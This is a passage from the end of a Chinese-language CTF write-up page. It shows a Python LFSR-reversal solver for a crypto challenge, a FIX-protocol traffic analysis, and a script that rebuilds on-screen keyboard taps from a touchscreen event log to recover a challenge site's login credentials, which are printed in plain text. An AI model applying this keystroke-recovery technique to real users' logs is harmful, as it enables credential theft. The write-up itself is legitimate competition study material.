t = <span class="hljs-built_in">int</span>(s, <span class="hljs-number">2</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">t</span>):</span>
    state = t
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;01&quot;</span>:
        tmp = <span class="hljs-built_in">bin</span>(state)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">384</span>)[<span class="hljs-number">1</span>:] + i
        tmp = <span class="hljs-built_in">int</span>(tmp, <span class="hljs-number">2</span>)
        <span class="hljs-keyword">if</span> lfsr(tmp) == state:
            <span class="hljs-keyword">return</span> tmp
state = t

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">384</span>+length):
    state = solve(state)
flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):
    c = ct[_][<span class="hljs-number">1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">384</span>):
        <span class="hljs-keyword">if</span> (state &gt;&gt; i) &amp; <span class="hljs-number">1</span> == <span class="hljs-number">1</span>:
            tmp += <span class="hljs-string">&quot;1&quot;</span>
            c -= pk[i][<span class="hljs-number">1</span>]
    c = c % <span class="hljs-number">16411</span>
    <span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:
        flag += <span class="hljs-string">&quot;0&quot;</span>
    <span class="hljs-keyword">else</span>:
        flag += <span class="hljs-string">&quot;1&quot;</span>
    state = lfsr(state)

<span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag, <span class="hljs-number">2</span>)))
r.close()
<span class="hljs-comment">#flag{your_fluxmarket_stock_may_shift_up_now}</span></code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc:</h2>
<h3 id="tenbaggernone"><a class="header-link" href="#tenbaggernone"></a>Tenbagger(NONE):</h3>
<p>流量文件中存在大量无法被解密的TLS流量，且多数网站通过DNS解析记录得知目标为正常网站，不在本题目范围内。
在此过滤所有TLS、DNS流量以及其指向的地址。
发现FIX协议的本地到本地发送的流量，而该协议为金融相关，断定题目关键位置在此。</p>
<p class="img-container"><img src="https://i.imgur.com/26qPyFS.png" alt=""></p>
<p>拼接即可</p>
<p>flag:</p>
<pre class="hljs"><code><span class="hljs-attribute">flag</span>{t<span class="hljs-number">0</span>_th<span class="hljs-number">3</span>_m<span class="hljs-number">00</span>n_<span class="hljs-number">4</span>nd_b<span class="hljs-number">4</span>ck}</code></pre><h3 id="touchy-loggerlow"><a class="header-link" href="#touchy-loggerlow"></a>Touchy Logger(Low):</h3>
<p>整个触屏过程很复杂，但我们只需要提取出明显的点击操作，具体就是：TOUCH_DOWN、TOUCH_FRAME 和 TOUCH_UP 三个合成一组的指令</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> cv2

pattern = <span class="hljs-string">r&#x27; event5   TOUCH_DOWN       \+[\d]{1,3}\.[\d]{1,3}s\t0 \(0\)[ ]{1,3}[\d]{1,3}\.[\d]{1,3}/[\d]{1,3}\.[\d]{1,3} \([\d]{1,3}\.[\d]{1,3}/[\d]{2,3}\.[\d]{2}mm\)\n&#x27;</span>
pattern += <span class="hljs-string">r&#x27; event5   TOUCH_FRAME      \+[\d]{1,3}\.[\d]{1,3}s\t\n&#x27;</span>
pattern += <span class="hljs-string">r&#x27; event5   TOUCH_UP         \+[\d]{1,3}\.[\d]{1,3}&#x27;</span>

f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;touch.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)
content = f.read()
f.close()

rows = re.findall(pattern, content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cap</span>():</span>
    timePattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\+([0-9]+)\.([0-9]{3})s&#x27;</span>)
    coodPattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\( ?([0-9\.]+)/ ?([0-9\.]+)mm\)&#x27;</span>)
    
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rows:
        time=timePattern.search(row)
        time=<span class="hljs-built_in">int</span>(time.group(<span class="hljs-number">1</span>))*<span class="hljs-number">1000</span>+<span class="hljs-built_in">int</span>(time.group(<span class="hljs-number">2</span>))
        p=coodPattern.search(row)
        x=<span class="hljs-built_in">float</span>(p.group(<span class="hljs-number">1</span>))
        y=<span class="hljs-built_in">float</span>(p.group(<span class="hljs-number">2</span>))
        <span class="hljs-keyword">yield</span> (<span class="hljs-string">&#x27;&#x27;</span>,time,x,y)

fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;XVID&#x27;</span>)
fps=<span class="hljs-number">10.0</span>
out = cv2.VideoWriter(<span class="hljs-string">&#x27;touch.avi&#x27;</span>, fourcc, fps, (<span class="hljs-number">259</span>, <span class="hljs-number">173</span>))
history=[[]]
totalTime=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cap():
    time=i[<span class="hljs-number">1</span>]
    history[-<span class="hljs-number">1</span>].append((i[<span class="hljs-number">2</span>],i[<span class="hljs-number">3</span>]))
    frame=np.zeros((<span class="hljs-number">173</span>,<span class="hljs-number">259</span>,<span class="hljs-number">3</span>),np.uint8)+<span class="hljs-number">255</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> history[:-<span class="hljs-number">1</span>]:
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> j:
            cv2.circle(frame,(<span class="hljs-built_in">int</span>(k[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(k[<span class="hljs-number">1</span>])),<span class="hljs-number">1</span>,(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),-<span class="hljs-number">1</span>)
    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> history[-<span class="hljs-number">1</span>]:
        cv2.circle(frame,(<span class="hljs-built_in">int</span>(k[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(k[<span class="hljs-number">1</span>])),<span class="hljs-number">1</span>,(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>),-<span class="hljs-number">1</span>)

    <span class="hljs-keyword">while</span> totalTime&lt;time:
        <span class="hljs-built_in">print</span>(totalTime)
        totalTime+=<span class="hljs-number">100</span>
        out.write(frame)
out.release()</code></pre><p>然后，用 Pr 或 Ae 将一个 Ubuntu 虚拟键盘的图片放上去，就可以看得比较清楚：
不支持在 Docs 外粘贴 block
最后捕捉到的关键输入内容：</p>
<p class="img-container"><img src="https://s3.bmp.ovh/imgs/2021/11/155dafc66b51bad9.gif" alt=""></p>
<p>网站：<a href="https://investment24.flu.xxx/user/login">https://investment24.flu.xxx/user/login</a></p>
<p class="img-container"><img src="https://i.imgur.com/bvyiVYR.png" alt=""></p>
<p>账号：fluxmanfred
密码：OiVyi)=wi$?;Ezq-lZx# 
登录就是 flag 了</p>
<p class="img-container"><img src="https://i.imgur.com/6lz6qy6.png" alt=""></p>
<p>flag:</p>
<pre class="hljs"><code><span class="hljs-attribute">flag</span>{only_diamond_h<span class="hljs-number">4</span>nds_can_touch_this}</code></pre>        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
